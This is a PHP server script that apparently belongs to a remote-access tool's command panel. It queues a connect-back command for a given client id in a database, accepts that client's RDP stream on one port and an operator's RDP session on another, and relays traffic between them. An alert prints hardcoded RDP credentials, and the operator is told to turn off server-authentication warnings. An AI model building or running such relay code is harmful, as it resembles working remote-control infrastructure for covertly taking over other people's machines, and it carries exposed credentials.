
<?php
include"db.php";
set_time_limit(0);
ini_set('output_buffering', 'off');
ini_set('implicit_flush', true);
ob_implicit_flush(true);

$currentadminport=0;

if(!isset($_GET["id"])){echo"missing client id";exit();}



function createSocket($ip, $usr,$con) {
    $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);

    if ($socket === false) {
        echo "Failed to create socket: " . socket_strerror(socket_last_error()) . PHP_EOL;
        return false;
    }
	
	$port=5000;
	$endport=$port+50;
	$fullHost=$_SERVER['HTTP_HOST'];
	$parsedUrl = parse_url($fullHost);
	$ipsrv = $parsedUrl['host'];
	if($usr===1){$port=3000;}
	$binded=0;
	for($i=$port;$i<$endport;$i+=1){
		if(@socket_bind($socket, $ip, $i)!=false){$binded=$i;break;}
		
	}
	
	if($binded===0){socket_close($socket);return false;}
	if($usr===1){$currentadminport=$binded;echo "<script>alert('Client RDP session initialized.\\n Connect to rdp using $ipsrv:$binded   \\nusername:netmaster password:rdp.f3di006')</script>";flush();}
	else{ 
	$id=mysqli_real_escape_string($con,$_GET["id"]);
	$command="8|$binded";
	if(mysqli_query($con,"INSERT INTO commands VALUES ('$id','$command')")==FALSE){echo"error DB";exit();}
	
	} 
    if (!socket_listen($socket)) {
        echo "Failed to listen on socket: " . socket_strerror(socket_last_error()) . PHP_EOL;
        socket_close($socket);
        return false;
    }

	socket_set_nonblock($socket);
	
	$connected=0;

	for($i=0;$i<20;$i+=1){
	$clientsock = socket_accept($socket);

	if($clientsock!=false){$connected=1;break;}
	sleep(1);

	}
	if($connected==0){socket_close($socket);return false;}
	if($clientsock==false){socket_close($socket);return false;}
	
	
	socket_set_block($clientsock);
    return $clientsock;
}


echo" Warning : change 'if server authentication fails :' to 'Connect and don't warn me' in the rdp Advanced options before connecting to the session<br>";
echo "Waiting for client rdp session...<br>";
$clientsock=createSocket("0.0.0.0",2,$con);
if($clientsock===false){echo"client failed to connect";exit();}
echo "Waiting for admin to connect...<br>";
$adminsock=createSocket("0.0.0.0",1,$con);



if($adminsock===false){echo"admin failed to connect to rdp session";socket_close($clientsock);exit();}

echo "admin connected !<br>";
//start connection


$read = array($clientsock, $adminsock);
$readbk=$read;
$write = NULL;
$except = NULL;
$data="";
while(1){
	$read=$readbk;
	$num_changed_sockets = socket_select($read, $write, $except, null);

	if ($num_changed_sockets === false) {
	} else if ($num_changed_sockets > 0) {
		/* At least at one of the sockets something interesting happened */
		foreach ($read as $changed_socket) {
			$n =@socket_recv ( $changed_socket , $data , 1024 ,0 );
				$other_socket = ($changed_socket === $clientsock) ? $adminsock : $clientsock;
				if(@socket_write($other_socket, $data)===false ){break;}
				
				if ($n == false || $n==0) { goto end;}
		}
	}
}
end:
echo "Session was ended .";
socket_close($clientsock);
socket_close($adminsock);
?>